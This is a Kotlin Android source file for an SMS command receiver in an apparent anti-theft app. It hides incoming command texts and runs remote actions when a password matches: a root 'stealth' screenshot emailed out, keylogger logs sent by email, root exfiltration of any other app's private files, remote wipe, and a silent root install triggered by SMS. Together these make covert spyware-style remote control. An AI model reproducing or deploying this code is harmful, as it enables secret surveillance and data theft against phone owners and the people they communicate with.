package com.hamoon.uncleted.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.hamoon.uncleted.LockScreenActivity
import com.hamoon.uncleted.data.SecurityPreferences
import com.hamoon.uncleted.services.PanicActionService
import com.hamoon.uncleted.util.AdvancedEmailSender
import com.hamoon.uncleted.util.EmailSender
import com.hamoon.uncleted.util.EventLogger
import com.hamoon.uncleted.util.RootActions
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsCommandReceiver : BroadcastReceiver() {

    private val TAG = "SmsCommandReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            return
        }

        val masterPassword = SecurityPreferences.getSmsMasterPassword(context)
        val installCode = SecurityPreferences.getRemoteInstallCode(context)

        if (masterPassword.isNullOrEmpty()) {
            Log.w(TAG, "SMS Master Password is not set. Ignoring all commands.")
            return
        }

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        messages?.forEach { sms ->
            val body = sms.messageBody.trim()
            val senderNum = sms.originatingAddress
            val parts = body.split(" ")

            // Standard commands with optional arguments
            if (parts.isNotEmpty() && parts[0].equals("UNCLETED", ignoreCase = true) && parts.size >= 3) {
                val command = parts[1].uppercase()
                val password = parts.last()

                if (password == masterPassword) {
                    abortBroadcast()
                    val args = if (parts.size > 3) parts.subList(2, parts.size - 1) else emptyList()
                    handleAuthenticatedCommand(context, command, senderNum, args)
                } else {
                    Log.w(TAG, "Invalid master password received from $senderNum. Command ignored.")
                    EventLogger.log(context, "SMS command received from $senderNum with incorrect password.")
                }
                return@forEach
            }

            // Root install command
            if (SecurityPreferences.isSilentInstallEnabled(context) && !installCode.isNullOrEmpty() && body.contains(installCode)) {
                abortBroadcast()
                Log.i(TAG, "Remote Install command received from $senderNum.")
                val pendingResult = goAsync()
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        RootActions.performSilentInstall(context)
                    } finally {
                        pendingResult.finish()
                    }
                }
                return@forEach
            }
        }
    }

    private fun handleAuthenticatedCommand(context: Context, command: String, sender: String?, args: List<String>) {
        Log.i(TAG, "Authenticated SMS command '$command' received from $sender with args: $args.")
        EventLogger.log(context, "Authenticated SMS command '$command' received from $sender.")

        when (command) {
            "WIPE" -> {
                PanicActionService.trigger(context, "REMOTE_WIPE", PanicActionService.Severity.CRITICAL)
            }
            "SIREN" -> {
                PanicActionService.trigger(context, "REMOTE_SIREN", PanicActionService.Severity.HIGH)
            }
            "LOCK" -> {
                val lockIntent = Intent(context, LockScreenActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                }
                context.startActivity(lockIntent)
            }
            "SCREENSHOT" -> {
                val pendingResult = goAsync()
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        val screenshot = RootActions.takeStealthScreenshot(context)
                        screenshot?.let {
                            AdvancedEmailSender.sendAdvancedAlert(
                                context,
                                AdvancedEmailSender.EmailTemplate("Remote Screenshot", "Screenshot captured remotely via SMS command."),
                                screenshotFile = it
                            )
                        }
                    } finally {
                        pendingResult.finish()
                    }
                }
            }
            "GETLOGS" -> {
                val emergencyContact = SecurityPreferences.getEmergencyContact(context)
                if (emergencyContact.isNullOrEmpty() || !emergencyContact.contains("@")) return

                val logs = SecurityPreferences.getKeylogData(context)
                if (!logs.isNullOrEmpty()) {
                    val pendingResult = goAsync()
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            EmailSender.sendEmail(
                                context,
                                emergencyContact,
                                "Remote Keylog Data",
                                "Keylogger data retrieved via SMS command:\n\n$logs"
                            )
                            SecurityPreferences.clearKeylogData(context)
                        } finally {
                            pendingResult.finish()
                        }
                    }
                }
            }
            "EXFIL" -> {
                if (args.size == 2) {
                    val packageName = args[0]
                    val path = args[1]
                    val pendingResult = goAsync()
                    CoroutineScope(Dispatchers.IO).launch {
                        try {
                            val exfilFile = RootActions.exfiltrateAppData(context, packageName, path)
                            val emergencyContact = SecurityPreferences.getEmergencyContact(context)
                            if (exfilFile != null && emergencyContact != null && emergencyContact.contains("@")) {
                                EmailSender.sendEmail(
                                    context,
                                    emergencyContact,
                                    "Data Exfiltration Complete",
                                    "Successfully exfiltrated file '$path' from package '$packageName'. File is attached.",
                                    attachmentFile = exfilFile
                                )
                            }
                        } finally {
                            pendingResult.finish()
                        }
                    }
                }
            }
            else -> {
                Log.w(TAG, "Unknown authenticated command '$command' from $sender.")
                EventLogger.log(context, "Unknown authenticated SMS command '$command' from $sender.")
            }
        }
    }
}